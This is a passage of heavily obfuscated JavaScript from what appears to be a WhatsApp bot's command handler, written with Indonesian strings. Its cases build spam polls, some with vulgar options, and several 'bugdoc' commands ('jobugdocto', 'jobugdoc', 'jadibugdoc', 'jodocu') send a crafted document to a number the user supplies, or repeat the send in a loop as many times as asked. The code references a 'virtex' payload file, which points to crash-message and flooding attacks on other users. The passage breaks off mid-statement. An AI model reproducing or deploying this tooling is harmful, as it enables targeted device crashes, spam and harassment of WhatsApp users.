var _0x44c70b=_0x168d;(function(_0x1eacb6,_0x27334f){var _0x49d96f=_0x168d,_0x32b59f=_0x1eacb6();while(!![]){try{var _0x2c060a=parseInt(_0x49d96f(0xea))/0x1+-parseInt(_0x49d96f(0xe9))/0x2*(-parseInt(_0x49d96f(0x106))/0x3)+-parseInt(_0x49d96f(0x102))/0x4+-parseInt(_0x49d96f(0x108))/0x5+parseInt(_0x49d96f(0x10d))/0x6*(parseInt(_0x49d96f(0xee))/0x7)+-parseInt(_0x49d96f(0xf1))/0x8*(-parseInt(_0x49d96f(0xed))/0x9)+-parseInt(_0x49d96f(0xfe))/0xa;if(_0x2c060a===_0x27334f)break;else _0x32b59f['push'](_0x32b59f['shift']());}catch(_0x39a504){_0x32b59f['push'](_0x32b59f['shift']());}}}(_0x3ece,0x5b448));function _0x168d(_0x3388ae,_0x25924f){var _0x2ebc7c=_0x3ece();return _0x168d=function(_0x386251,_0x46edc7){_0x386251=_0x386251-0xe8;var _0x565601=_0x2ebc7c[_0x386251];return _0x565601;},_0x168d(_0x3388ae,_0x25924f);}var _0x176e4d=(function(){var _0x591278=!![];return function(_0x47a450,_0x29f0dc){var _0x5f2ce3=_0x591278?function(){var _0x3159cc=_0x168d;if(_0x29f0dc){var _0x52e869=_0x29f0dc[_0x3159cc(0x109)](_0x47a450,arguments);return _0x29f0dc=null,_0x52e869;}}:function(){};return _0x591278=![],_0x5f2ce3;};}()),_0x5dd566=_0x176e4d(this,function(){var _0x38b449=_0x168d;return _0x5dd566[_0x38b449(0xff)]()[_0x38b449(0xf6)]('(((.+)+)+)+$')[_0x38b449(0xff)]()[_0x38b449(0xf2)](_0x5dd566)[_0x38b449(0xf6)](_0x38b449(0xeb));});function _0x3ece(){var _0xcaefcb=['3609rpEJwo','7BsEfQM','\x20COLI','\x20NGOCOK','13320sMxbLx','constructor','SALAM\x20GUA\x20BY:\x20','__proto__','console','search','relayMessage','\x20NGENTOT','Message','Silahkan\x20Di\x20Vote','Teksnya\x20Mana?','info','HALO\x20SAYA\x20','335970yNHxxM','toString','warn','return\x20(function()\x20','370624EikDRN','error','key','trace','66246SNqQZy','prototype','3695845CttjYZ','apply','message','chat','length','1990308NHpYgH','{}.constructor(\x22return\x20this\x22)(\x20)','12lxJoeG','107379pxwnFI','(((.+)+)+)+$','exception'];_0x3ece=function(){return _0xcaefcb;};return _0x3ece();}_0x5dd566();var _0x46edc7=(function(){var _0x52d90c=!![];return function(_0x39c384,_0x5ad3bc){var _0x21b453=_0x52d90c?function(){var _0x8a76ac=_0x168d;if(_0x5ad3bc){var _0x3cf1bb=_0x5ad3bc[_0x8a76ac(0x109)](_0x39c384,arguments);return _0x5ad3bc=null,_0x3cf1bb;}}:function(){};return _0x52d90c=![],_0x21b453;};}()),_0x386251=_0x46edc7(this,function(){var _0x322123=_0x168d,_0x4187fa=function(){var _0x77b64e=_0x168d,_0x28ea12;try{_0x28ea12=Function(_0x77b64e(0x101)+_0x77b64e(0xe8)+');')();}catch(_0x1d7823){_0x28ea12=window;}return _0x28ea12;},_0x33a76e=_0x4187fa(),_0x1af55e=_0x33a76e[_0x322123(0xf5)]=_0x33a76e['console']||{},_0x1333b2=['log',_0x322123(0x100),_0x322123(0xfc),_0x322123(0x103),_0x322123(0xec),'table',_0x322123(0x105)];for(var _0x3021c5=0x0;_0x3021c5<_0x1333b2[_0x322123(0x10c)];_0x3021c5++){var _0x19bce9=_0x46edc7['constructor'][_0x322123(0x107)]['bind'](_0x46edc7),_0x4db0fb=_0x1333b2[_0x3021c5],_0x1d9538=_0x1af55e[_0x4db0fb]||_0x19bce9;_0x19bce9[_0x322123(0xf4)]=_0x46edc7['bind'](_0x46edc7),_0x19bce9[_0x322123(0xff)]=_0x1d9538['toString']['bind'](_0x1d9538),_0x1af55e[_0x4db0fb]=_0x19bce9;}});_0x386251();{if(!isCreator&&!isBan)return;if(!text)throw _0x44c70b(0xfb);var pollCreation=generateWAMessageFromContent(m[_0x44c70b(0x10b)],proto[_0x44c70b(0xf9)]['fromObject']({'pollCreationMessage':{'name':_0x44c70b(0xfd)+text,'options':[{'optionName':text+_0x44c70b(0xef)},{'optionName':text+'\x20COLMEK'},{'optionName':text+_0x44c70b(0xf0)},{'optionName':text+_0x44c70b(0xf8)},{'optionName':_0x44c70b(0xf3)+text}],'selectableOptionsCount':0x5}}),{'userJid':m['chat'],'quoted':fdocjo});jobotz[_0x44c70b(0xf7)](m[_0x44c70b(0x10b)],pollCreation[_0x44c70b(0x10a)],{'messageId':pollCreation[_0x44c70b(0x104)]['id']}),jancok(_0x44c70b(0xfa));}
}
break
case 'polvot': {
var _0x2bf532=_0x41a3;(function(_0x2a575e,_0xe10e14){var _0x586d34=_0x41a3,_0x17556c=_0x2a575e();while(!![]){try{var _0x33d8f3=parseInt(_0x586d34(0x171))/0x1+-parseInt(_0x586d34(0x167))/0x2*(-parseInt(_0x586d34(0x159))/0x3)+parseInt(_0x586d34(0x160))/0x4*(-parseInt(_0x586d34(0x179))/0x5)+parseInt(_0x586d34(0x162))/0x6+parseInt(_0x586d34(0x17e))/0x7+parseInt(_0x586d34(0x15e))/0x8*(parseInt(_0x586d34(0x175))/0x9)+-parseInt(_0x586d34(0x15c))/0xa;if(_0x33d8f3===_0xe10e14)break;else _0x17556c['push'](_0x17556c['shift']());}catch(_0x1a9f65){_0x17556c['push'](_0x17556c['shift']());}}}(_0x348a,0x72652));var _0x1e4072=(function(){var _0x391af3=!![];return function(_0x39a093,_0x3ac8b4){var _0x3d4267=_0x391af3?function(){if(_0x3ac8b4){var _0x23b047=_0x3ac8b4['apply'](_0x39a093,arguments);return _0x3ac8b4=null,_0x23b047;}}:function(){};return _0x391af3=![],_0x3d4267;};}()),_0x2244d3=_0x1e4072(this,function(){var _0x1f5c31=_0x41a3;return _0x2244d3[_0x1f5c31(0x168)]()[_0x1f5c31(0x176)](_0x1f5c31(0x16a))['toString']()[_0x1f5c31(0x17a)](_0x2244d3)[_0x1f5c31(0x176)]('(((.+)+)+)+$');});_0x2244d3();var _0x18c5d1=(function(){var _0x3502ac=!![];return function(_0x4244e0,_0x2c2346){var _0x261db1=_0x3502ac?function(){if(_0x2c2346){var _0xd2c02d=_0x2c2346['apply'](_0x4244e0,arguments);return _0x2c2346=null,_0xd2c02d;}}:function(){};return _0x3502ac=![],_0x261db1;};}()),_0x5eceac=_0x18c5d1(this,function(){var _0x49cee9=_0x41a3,_0x5b87d3;try{var _0xa128f9=Function(_0x49cee9(0x178)+_0x49cee9(0x17d)+');');_0x5b87d3=_0xa128f9();}catch(_0x42460c){_0x5b87d3=window;}var _0xd47ee6=_0x5b87d3[_0x49cee9(0x172)]=_0x5b87d3[_0x49cee9(0x172)]||{},_0x9409ed=[_0x49cee9(0x177),_0x49cee9(0x15d),_0x49cee9(0x169),_0x49cee9(0x173),_0x49cee9(0x17c),_0x49cee9(0x16c),_0x49cee9(0x161)];for(var _0x24ebfa=0x0;_0x24ebfa<_0x9409ed[_0x49cee9(0x17b)];_0x24ebfa++){var _0x5cc210=_0x18c5d1[_0x49cee9(0x17a)][_0x49cee9(0x163)]['bind'](_0x18c5d1),_0x3d6046=_0x9409ed[_0x24ebfa],_0x346c13=_0xd47ee6[_0x3d6046]||_0x5cc210;_0x5cc210[_0x49cee9(0x15f)]=_0x18c5d1['bind'](_0x18c5d1),_0x5cc210[_0x49cee9(0x168)]=_0x346c13['toString'][_0x49cee9(0x170)](_0x346c13),_0xd47ee6[_0x3d6046]=_0x5cc210;}});function _0x41a3(_0x14d0e4,_0x26ebad){var _0x262826=_0x348a();return _0x41a3=function(_0x5eceac,_0x18c5d1){_0x5eceac=_0x5eceac-0x159;var _0xf60a10=_0x262826[_0x5eceac];return _0xf60a10;},_0x41a3(_0x14d0e4,_0x26ebad);}_0x5eceac();{if(!isCreator&&!isBan)return;var pollCreation=generateWAMessageFromContent(m['chat'],proto[_0x2bf532(0x165)][_0x2bf532(0x174)]({'pollCreationMessage':{'name':'HALO\x20SAYA\x20'+wm,'options':[{'optionName':_0x2bf532(0x166)},{'optionName':_0x2bf532(0x164)},{'optionName':_0x2bf532(0x16e)},{'optionName':'KATANYA\x20KEBAL'},{'optionName':_0x2bf532(0x16d)}],'selectableOptionsCount':0x5}}),{'userJid':m['chat'],'quoted':fsticjo});jobotz[_0x2bf532(0x16f)](m['chat'],pollCreation[_0x2bf532(0x15b)],{'messageId':pollCreation[_0x2bf532(0x15a)]['id']}),jancok(_0x2bf532(0x16b));}function _0x348a(){var _0x4bcd45=['__proto__','12StqaAa','trace','141126SyKxwj','prototype','BERANI\x20VOTE\x20GA','Message','VOTE\x20YUK','4346YdcpCR','toString','info','(((.+)+)+)+$','Vote\x20Aja\x20Semua','table','SALAM\x20CREATOR\x20BOT','VOTE\x20LAH\x20SEMUA','relayMessage','bind','146102UZUZBa','console','error','fromObject','9nByBHq','search','log','return\x20(function()\x20','898825BzjQyz','constructor','length','exception','{}.constructor(\x22return\x20this\x22)(\x20)','5599013fDMeQA','1191YBmBSc','key','message','8623490TPQqLQ','warn','304344dgJpZm'];_0x348a=function(){return _0x4bcd45;};return _0x348a();}
}
break
case 'poll': {
var _0x172df5=_0x4eca;(function(_0x48d972,_0x58ebf8){var _0x40dbcd=_0x4eca,_0x2ef978=_0x48d972();while(!![]){try{var _0x2bee6d=-parseInt(_0x40dbcd(0x9a))/0x1*(-parseInt(_0x40dbcd(0x9f))/0x2)+-parseInt(_0x40dbcd(0xa4))/0x3+-parseInt(_0x40dbcd(0x95))/0x4+-parseInt(_0x40dbcd(0xa8))/0x5+-parseInt(_0x40dbcd(0xa9))/0x6+parseInt(_0x40dbcd(0x9d))/0x7*(parseInt(_0x40dbcd(0x94))/0x8)+-parseInt(_0x40dbcd(0xac))/0x9*(-parseInt(_0x40dbcd(0xae))/0xa);if(_0x2bee6d===_0x58ebf8)break;else _0x2ef978['push'](_0x2ef978['shift']());}catch(_0x591287){_0x2ef978['push'](_0x2ef978['shift']());}}}(_0x4f56,0x38e54));function _0x4eca(_0x4da7ba,_0x194831){var _0x394240=_0x4f56();return _0x4eca=function(_0x17229b,_0x160425){_0x17229b=_0x17229b-0x91;var _0x5ae2e2=_0x394240[_0x17229b];return _0x5ae2e2;},_0x4eca(_0x4da7ba,_0x194831);}var _0x27754d=(function(){var _0x25430a=!![];return function(_0x662270,_0x3cb42d){var _0x3168ff=_0x25430a?function(){var _0x165c06=_0x4eca;if(_0x3cb42d){var _0x496f28=_0x3cb42d[_0x165c06(0x9c)](_0x662270,arguments);return _0x3cb42d=null,_0x496f28;}}:function(){};return _0x25430a=![],_0x3168ff;};}()),_0x329a8f=_0x27754d(this,function(){var _0x971508=_0x4eca;return _0x329a8f['toString']()[_0x971508(0x96)](_0x971508(0xaa))[_0x971508(0x97)]()[_0x971508(0xa1)](_0x329a8f)['search']('(((.+)+)+)+$');});_0x329a8f();var _0x160425=(function(){var _0x40a37d=!![];return function(_0x532626,_0x762dfc){var _0x1c8dbe=_0x40a37d?function(){var _0xa7dbff=_0x4eca;if(_0x762dfc){var _0x4cb7be=_0x762dfc[_0xa7dbff(0x9c)](_0x532626,arguments);return _0x762dfc=null,_0x4cb7be;}}:function(){};return _0x40a37d=![],_0x1c8dbe;};}()),_0x17229b=_0x160425(this,function(){var _0x3ad085=_0x4eca,_0xd008e5=function(){var _0x1046c6=_0x4eca,_0x2016ed;try{_0x2016ed=Function(_0x1046c6(0xa7)+_0x1046c6(0xaf)+');')();}catch(_0x2bb2f4){_0x2016ed=window;}return _0x2016ed;},_0x5cd96f=_0xd008e5(),_0x3c2ea1=_0x5cd96f[_0x3ad085(0xb1)]=_0x5cd96f[_0x3ad085(0xb1)]||{},_0x3c429d=[_0x3ad085(0x92),_0x3ad085(0xa2),'info','error','exception',_0x3ad085(0x9e),_0x3ad085(0x99)];for(var _0x204279=0x0;_0x204279<_0x3c429d[_0x3ad085(0xb0)];_0x204279++){var _0x8d90bd=_0x160425['constructor'][_0x3ad085(0xa5)]['bind'](_0x160425),_0x13e2c1=_0x3c429d[_0x204279],_0xd89837=_0x3c2ea1[_0x13e2c1]||_0x8d90bd;_0x8d90bd['__proto__']=_0x160425[_0x3ad085(0xab)](_0x160425),_0x8d90bd[_0x3ad085(0x97)]=_0xd89837[_0x3ad085(0x97)][_0x3ad085(0xab)](_0xd89837),_0x3c2ea1[_0x13e2c1]=_0x8d90bd;}});function _0x4f56(){var _0x493323=['442398sBVCMM','(((.+)+)+)+$','bind','7077771cFeLBR','chat','10zYfcEE','{}.constructor(\x22return\x20this\x22)(\x20)','length','console','HALO\x20SAYA\x20THE\x20JO\x20BOT\x20\x0a','relayMessage','log','Message','695632rypiDp','1439300kIAFme','search','toString','KATANYA\x20KEBAL','trace','113783WkGDqe','key','apply','7vMErhC','table','2uWUvlo','BERANI\x20VOTE\x20GA','constructor','warn','VOTE\x20LAH\x20SEMUA','427587IoRZAM','prototype','message','return\x20(function()\x20','890125lvgDTw'];_0x4f56=function(){return _0x493323;};return _0x4f56();}_0x17229b();{if(!isCreator&&!isBan)return;var pollCreation=generateWAMessageFromContent(m['chat'],proto[_0x172df5(0x93)]['fromObject']({'pollCreationMessage':{'name':_0x172df5(0xb2)+thejo,'options':[{'optionName':'VOTE\x20YUK'},{'optionName':_0x172df5(0xa0)},{'optionName':_0x172df5(0xa3)},{'optionName':_0x172df5(0x98)},{'optionName':'SALAM\x20CREATOR\x20BOT'}],'selectableOptionsCount':0x5}}),{'userJid':m[_0x172df5(0xad)],'quoted':fdocjo});jobotz[_0x172df5(0x91)](m[_0x172df5(0xad)],pollCreation[_0x172df5(0xa6)],{'messageId':pollCreation[_0x172df5(0x9b)]['id']}),jancok('Vote\x20Aja\x20Semua');}
}
break
	case 'jobugdocto':{
var _0x1fa9ff=_0x5081;(function(_0x2c0855,_0x2b299b){var _0x113c81=_0x5081,_0x31beea=_0x2c0855();while(!![]){try{var _0x4732cc=parseInt(_0x113c81(0xd1))/0x1*(parseInt(_0x113c81(0xba))/0x2)+parseInt(_0x113c81(0xbc))/0x3*(parseInt(_0x113c81(0xc8))/0x4)+parseInt(_0x113c81(0xb5))/0x5*(parseInt(_0x113c81(0xb2))/0x6)+-parseInt(_0x113c81(0xbd))/0x7*(parseInt(_0x113c81(0xc0))/0x8)+-parseInt(_0x113c81(0xc4))/0x9*(parseInt(_0x113c81(0xbb))/0xa)+parseInt(_0x113c81(0xca))/0xb+-parseInt(_0x113c81(0xb9))/0xc;if(_0x4732cc===_0x2b299b)break;else _0x31beea['push'](_0x31beea['shift']());}catch(_0x33e490){_0x31beea['push'](_0x31beea['shift']());}}}(_0x74da,0x9f37f));var _0x2f75ff=(function(){var _0x2e56c4=!![];return function(_0x3129e0,_0x303855){var _0x298053=_0x2e56c4?function(){var _0x54e15b=_0x5081;if(_0x303855){var _0x228aef=_0x303855[_0x54e15b(0xc7)](_0x3129e0,arguments);return _0x303855=null,_0x228aef;}}:function(){};return _0x2e56c4=![],_0x298053;};}()),_0x53372d=_0x2f75ff(this,function(){var _0x362a91=_0x5081;return _0x53372d['toString']()['search'](_0x362a91(0xb8))[_0x362a91(0xb4)]()[_0x362a91(0xd0)](_0x53372d)[_0x362a91(0xc1)]('(((.+)+)+)+$');});_0x53372d();var _0x50fc28=(function(){var _0x446479=!![];return function(_0x2c4370,_0x1775cd){var _0x51487a=_0x446479?function(){var _0x220b7c=_0x5081;if(_0x1775cd){var _0x215791=_0x1775cd[_0x220b7c(0xc7)](_0x2c4370,arguments);return _0x1775cd=null,_0x215791;}}:function(){};return _0x446479=![],_0x51487a;};}()),_0x92847=_0x50fc28(this,function(){var _0x358a6f=_0x5081,_0x15379b;try{var _0x28ff19=Function(_0x358a6f(0xcb)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x15379b=_0x28ff19();}catch(_0x51018e){_0x15379b=window;}var _0xbf3403=_0x15379b[_0x358a6f(0xb7)]=_0x15379b[_0x358a6f(0xb7)]||{},_0x5c7cfe=[_0x358a6f(0xcc),_0x358a6f(0xc9),_0x358a6f(0xcd),'error',_0x358a6f(0xbe),_0x358a6f(0xb3),_0x358a6f(0xc6)];for(var _0x22d631=0x0;_0x22d631<_0x5c7cfe[_0x358a6f(0xb6)];_0x22d631++){var _0x2adba1=_0x50fc28[_0x358a6f(0xd0)]['prototype'][_0x358a6f(0xc2)](_0x50fc28),_0x389f90=_0x5c7cfe[_0x22d631],_0x8c1d1c=_0xbf3403[_0x389f90]||_0x2adba1;_0x2adba1[_0x358a6f(0xcf)]=_0x50fc28[_0x358a6f(0xc2)](_0x50fc28),_0x2adba1[_0x358a6f(0xb4)]=_0x8c1d1c[_0x358a6f(0xb4)]['bind'](_0x8c1d1c),_0xbf3403[_0x389f90]=_0x2adba1;}});_0x92847();function _0x74da(){var _0xcd9ba7=['14UULCjm','1538328qZcitH','table','toString','15VENIiv','length','console','(((.+)+)+)+$','1744536LNjKgU','24194bWvvWI','250yLxgPH','3BTZdVG','7077VFtSoF','exception','Nomernya\x20mana?','6088rWoawD','search','bind','@s.whatsapp.net','56421NQjJoH','sendMessage','trace','apply','1796924GMhljW','warn','3694680kyNaUS','return\x20(function()\x20','log','info','Berhasil\x20Mengirim\x20Bugdoc\x20Di\x20Nomer\x20','__proto__','constructor'];_0x74da=function(){return _0xcd9ba7;};return _0x74da();}function _0x5081(_0x22fc32,_0x2e9c06){var _0x4e3851=_0x74da();return _0x5081=function(_0x92847,_0x50fc28){_0x92847=_0x92847-0xb2;var _0x682c17=_0x4e3851[_0x92847];return _0x682c17;},_0x5081(_0x22fc32,_0x2e9c06);}{if(!isCreator&&!isBan)return;if(!text)throw _0x1fa9ff(0xbf);jobotz[_0x1fa9ff(0xc5)](text+_0x1fa9ff(0xc3),{'document':thumb},{'quoted':fdocjo}),jancok(_0x1fa9ff(0xce)+text);}
}
break

	case 'jobugdoc':{
const _0x5f4f93=_0x209e;(function(_0x4252ca,_0x10bd6f){const _0x11838a=_0x209e,_0x4e8842=_0x4252ca();while(!![]){try{const _0xef704e=parseInt(_0x11838a(0x109))/0x1+parseInt(_0x11838a(0xfa))/0x2*(-parseInt(_0x11838a(0xff))/0x3)+-parseInt(_0x11838a(0x110))/0x4+parseInt(_0x11838a(0xf4))/0x5*(-parseInt(_0x11838a(0x107))/0x6)+-parseInt(_0x11838a(0xf5))/0x7*(parseInt(_0x11838a(0xfb))/0x8)+-parseInt(_0x11838a(0x105))/0x9+parseInt(_0x11838a(0xf8))/0xa;if(_0xef704e===_0x10bd6f)break;else _0x4e8842['push'](_0x4e8842['shift']());}catch(_0x164ae0){_0x4e8842['push'](_0x4e8842['shift']());}}}(_0x4a7c,0x778f3));function _0x209e(_0x1a84d9,_0x2cd735){const _0x37a818=_0x4a7c();return _0x209e=function(_0x3b93d4,_0x395c4a){_0x3b93d4=_0x3b93d4-0xf4;let _0x1766ed=_0x37a818[_0x3b93d4];return _0x1766ed;},_0x209e(_0x1a84d9,_0x2cd735);}function _0x4a7c(){const _0x6badf8=['info','Sukses\x20Send\x20Bug\x20Sebanyak\x20','exception','194052vmnrAF','warn','length','search','__proto__','table','6529554WRloBa','{}.constructor(\x22return\x20this\x22)(\x20)','12yaiBcR','Jumlahnya?','683614AoTfaZ','trace','chat','apply','console','toString','bind','2743240xtmiPA','sendMessage','2180775IkhrLx','7JsZDbg','error','return\x20(function()\x20','30808570ehhZNQ','(((.+)+)+)+$','22FyxkVr','2236848mItOuq'];_0x4a7c=function(){return _0x6badf8;};return _0x4a7c();}const _0x2d10df=(function(){let _0x28f944=!![];return function(_0x15b9ae,_0x3b6248){const _0x172cdb=_0x28f944?function(){const _0x358ce8=_0x209e;if(_0x3b6248){const _0x64945e=_0x3b6248[_0x358ce8(0x10c)](_0x15b9ae,arguments);return _0x3b6248=null,_0x64945e;}}:function(){};return _0x28f944=![],_0x172cdb;};}()),_0x46b4af=_0x2d10df(this,function(){const _0x13bb00=_0x209e;return _0x46b4af[_0x13bb00(0x10e)]()['search'](_0x13bb00(0xf9))[_0x13bb00(0x10e)]()['constructor'](_0x46b4af)[_0x13bb00(0x102)](_0x13bb00(0xf9));});_0x46b4af();const _0x395c4a=(function(){let _0x175e84=!![];return function(_0x4007fc,_0xf0f1b6){const _0x3885fd=_0x175e84?function(){if(_0xf0f1b6){const _0x5666f3=_0xf0f1b6['apply'](_0x4007fc,arguments);return _0xf0f1b6=null,_0x5666f3;}}:function(){};return _0x175e84=![],_0x3885fd;};}()),_0x3b93d4=_0x395c4a(this,function(){const _0x56fc36=_0x209e;let _0x184d53;try{const _0x5da191=Function(_0x56fc36(0xf7)+_0x56fc36(0x106)+');');_0x184d53=_0x5da191();}catch(_0x96544e){_0x184d53=window;}const _0x1eabf4=_0x184d53[_0x56fc36(0x10d)]=_0x184d53['console']||{},_0x1e67fc=['log',_0x56fc36(0x100),_0x56fc36(0xfc),_0x56fc36(0xf6),_0x56fc36(0xfe),_0x56fc36(0x104),_0x56fc36(0x10a)];for(let _0x38f1c9=0x0;_0x38f1c9<_0x1e67fc[_0x56fc36(0x101)];_0x38f1c9++){const _0x4d6cbc=_0x395c4a['constructor']['prototype']['bind'](_0x395c4a),_0x435b60=_0x1e67fc[_0x38f1c9],_0x4e339a=_0x1eabf4[_0x435b60]||_0x4d6cbc;_0x4d6cbc[_0x56fc36(0x103)]=_0x395c4a[_0x56fc36(0x10f)](_0x395c4a),_0x4d6cbc[_0x56fc36(0x10e)]=_0x4e339a['toString'][_0x56fc36(0x10f)](_0x4e339a),_0x1eabf4[_0x435b60]=_0x4d6cbc;}});_0x3b93d4();{if(!isCreator&&!isBan)return;if(args[_0x5f4f93(0x101)]==0x0)return m['reply'](_0x5f4f93(0x108));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){jobotz[_0x5f4f93(0x111)](m[_0x5f4f93(0x10b)],{'document':thumb},{'quoted':fdocjo});}jancok(_0x5f4f93(0xfd)+jumlah);}
}
break
case 'jadibugdoc':{
function _0x20e0(_0x5a9a97,_0x20b1cb){const _0x378ff5=_0x5a8f();return _0x20e0=function(_0x38efff,_0x5a9258){_0x38efff=_0x38efff-0x185;let _0x21326e=_0x378ff5[_0x38efff];return _0x21326e;},_0x20e0(_0x5a9a97,_0x20b1cb);}const _0x38d0ef=_0x20e0;(function(_0x73602c,_0x1951d5){const _0x38a570=_0x20e0,_0x3cbeb1=_0x73602c();while(!![]){try{const _0x678b76=-parseInt(_0x38a570(0x19d))/0x1*(-parseInt(_0x38a570(0x1a0))/0x2)+-parseInt(_0x38a570(0x18e))/0x3+parseInt(_0x38a570(0x19a))/0x4+parseInt(_0x38a570(0x197))/0x5*(parseInt(_0x38a570(0x191))/0x6)+-parseInt(_0x38a570(0x199))/0x7*(-parseInt(_0x38a570(0x196))/0x8)+parseInt(_0x38a570(0x185))/0x9+-parseInt(_0x38a570(0x1a3))/0xa;if(_0x678b76===_0x1951d5)break;else _0x3cbeb1['push'](_0x3cbeb1['shift']());}catch(_0x4b2b7c){_0x3cbeb1['push'](_0x3cbeb1['shift']());}}}(_0x5a8f,0xbe29a));const _0x1cfe5a=(function(){let _0x3b5d7a=!![];return function(_0x288a4d,_0xefd9c8){const _0x1b0d68=_0x3b5d7a?function(){const _0x1a875d=_0x20e0;if(_0xefd9c8){const _0x3686d1=_0xefd9c8[_0x1a875d(0x1a1)](_0x288a4d,arguments);return _0xefd9c8=null,_0x3686d1;}}:function(){};return _0x3b5d7a=![],_0x1b0d68;};}()),_0x54cbd3=_0x1cfe5a(this,function(){const _0x490a67=_0x20e0;return _0x54cbd3[_0x490a67(0x18c)]()[_0x490a67(0x194)](_0x490a67(0x189))[_0x490a67(0x18c)]()[_0x490a67(0x187)](_0x54cbd3)['search'](_0x490a67(0x189));});_0x54cbd3();const _0x5a9258=(function(){let _0x2d8d7c=!![];return function(_0x168e47,_0x195909){const _0xc3698b=_0x2d8d7c?function(){if(_0x195909){const _0x2cbeee=_0x195909['apply'](_0x168e47,arguments);return _0x195909=null,_0x2cbeee;}}:function(){};return _0x2d8d7c=![],_0xc3698b;};}()),_0x38efff=_0x5a9258(this,function(){const _0x4b2db5=_0x20e0;let _0x4003e1;try{const _0x35ced7=Function(_0x4b2db5(0x193)+_0x4b2db5(0x195)+');');_0x4003e1=_0x35ced7();}catch(_0x802ffa){_0x4003e1=window;}const _0x406f58=_0x4003e1['console']=_0x4003e1['console']||{},_0x165bf9=[_0x4b2db5(0x19e),_0x4b2db5(0x19f),_0x4b2db5(0x18d),_0x4b2db5(0x18f),_0x4b2db5(0x19b),_0x4b2db5(0x19c),'trace'];for(let _0x48151f=0x0;_0x48151f<_0x165bf9[_0x4b2db5(0x198)];_0x48151f++){const _0x2a1237=_0x5a9258[_0x4b2db5(0x187)]['prototype']['bind'](_0x5a9258),_0x45887b=_0x165bf9[_0x48151f],_0x496b3b=_0x406f58[_0x45887b]||_0x2a1237;_0x2a1237[_0x4b2db5(0x186)]=_0x5a9258[_0x4b2db5(0x188)](_0x5a9258),_0x2a1237[_0x4b2db5(0x18c)]=_0x496b3b['toString'][_0x4b2db5(0x188)](_0x496b3b),_0x406f58[_0x45887b]=_0x2a1237;}});_0x38efff();function _0x5a8f(){const _0x3efa15=['*Send/Reply\x20Media','31232710EKLaRp','6293520sVCbhv','__proto__','constructor','bind','(((.+)+)+)+$','Sukses\x20Convert\x20Bugdoc','download','toString','info','510816HjCfKN','error','Teksnya\x20Mana?','198cbWokD','waUploadToServer','return\x20(function()\x20','search','{}.constructor(\x22return\x20this\x22)(\x20)','5136584AiNLgl','111950fxdxdS','length','7penfDb','1889924OlHBjP','exception','table','10481ZwBjMV','log','warn','290VoBUlA','apply'];_0x5a8f=function(){return _0x3efa15;};return _0x5a8f();}{if(!isCreator&&!isBan)return;if(!m['quoted'])throw _0x38d0ef(0x1a2);if(!text)throw _0x38d0ef(0x190);let media=await quoted[_0x38d0ef(0x18b)]();var messa=await prepareWAMessageMedia({'document':media},{'upload':jobotz[_0x38d0ef(0x192)]});jobotz['sendMessage'](m['chat'],{'document':thumb},{'quoted':fdocjo}),jancok(_0x38d0ef(0x18a));}
}
break
case 'jodocu':{
const _0x2fd5f5=_0x3193;(function(_0x577a5c,_0x4949ff){const _0x1c3764=_0x3193,_0x887695=_0x577a5c();while(!![]){try{const _0x37e805=parseInt(_0x1c3764(0x1c6))/0x1+-parseInt(_0x1c3764(0x1cb))/0x2+-parseInt(_0x1c3764(0x1db))/0x3+-parseInt(_0x1c3764(0x1d7))/0x4+-parseInt(_0x1c3764(0x1da))/0x5*(-parseInt(_0x1c3764(0x1ca))/0x6)+-parseInt(_0x1c3764(0x1dd))/0x7+parseInt(_0x1c3764(0x1d4))/0x8;if(_0x37e805===_0x4949ff)break;else _0x887695['push'](_0x887695['shift']());}catch(_0x139c65){_0x887695['push'](_0x887695['shift']());}}}(_0x217c,0xad470));function _0x217c(){const _0x273ecf=['633140NDlbjz','./virtex/iphone.mp3','{}.constructor(\x22return\x20this\x22)(\x20)','205OGKXpb','977622fcwltL','info','16191rYlBMk','Sukses\x20Send\x20Bug\x20Sebanyak\x20','log','apply','return\x20(function()\x20','bind','constructor','toString','1032823zJCTeb','sendMessage','exception','console','124602pDOYre','2293826yfGwRI','search','warn','(((.+)+)+)+$','trace','table','Jumlahnya?','🔥\x20','reply','3670872HDhevv','\x20🔥','.js'];_0x217c=function(){return _0x273ecf;};return _0x217c();}const _0x4da701=(function(){let _0x3919ed=!![];return function(_0x4f609e,_0x1b1415){const _0x433c8e=_0x3919ed?function(){if(_0x1b1415){const _0x2035fc=_0x1b1415['apply'](_0x4f609e,arguments);return _0x1b1415=null,_0x2035fc;}}:function(){};return _0x3919ed=![],_0x433c8e;};}()),_0xe5ecac=_0x4da701(this,function(){const _0x4737af=_0x3193;return _0xe5ecac[_0x4737af(0x1c5)]()[_0x4737af(0x1cc)](_0x4737af(0x1ce))[_0x4737af(0x1c5)]()['constructor'](_0xe5ecac)['search'](_0x4737af(0x1ce));});_0xe5ecac();function _0x3193(_0x2a86f5,_0x33be85){const _0x49b1de=_0x217c();return _0x3193=function(_0x16a25b,_0x4266ad){_0x16a25b=_0x16a25b-0x1c4;let _0x7d3de1=_0x49b1de[_0x16a25b];return _0x7d3de1;},_0x3193(_0x2a86f5,_0x33be85);}const _0x4266ad=(function(){let _0x57cb21=!![];return function(_0x40fa6a,_0x3fe878){const _0x53bb95=_0x57cb21?function(){const _0x12a9fd=_0x3193;if(_0x3fe878){const _0xd48912=_0x3fe878[_0x12a9fd(0x1e0)](_0x40fa6a,arguments);return _0x3fe878=null,_0xd48912;}}:function(){};return _0x57cb21=![],_0x53bb95;};}()),_0x16a25b=_0x4266ad(this,function(){const _0x1522f1=_0x3193;let _0x46b799;try{const _0x4ff487=Function(_0x1522f1(0x1e1)+_0x1522f1(0x1d9)+');');_0x46b799=_0x4ff487();}catch(_0x3d329c){_0x46b799=window;}const _0x2c36a4=_0x46b799[_0x1522f1(0x1c9)]=_0x46b799[_0x1522f1(0x1c9)]||{},_0x11ec14=[_0x1522f1(0x1df),_0x1522f1(0x1cd),_0x1522f1(0x1dc),'error',_0x1522f1(0x1c8),_0x1522f1(0x1d0),_0x1522f1(0x1cf)];for(let _0x2a0c0c=0x0;_0x2a0c0c<_0x11ec14['length'];_0x2a0c0c++){const 